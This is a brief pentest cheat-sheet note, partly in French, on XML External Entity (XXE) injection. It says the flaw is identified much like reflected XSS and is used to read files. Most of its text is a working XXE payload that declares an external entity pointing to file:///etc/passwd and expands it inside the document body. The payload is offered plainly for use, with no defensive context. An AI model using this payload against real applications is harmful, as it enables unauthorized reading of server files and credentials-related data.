XXE -> exploitation des fichiers XML
HOW TO IDENTIFY :
	similar to XSS REFLECTED

USED TO READ FILES OR STUFF AND BETTER...


PAYLOAD :
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
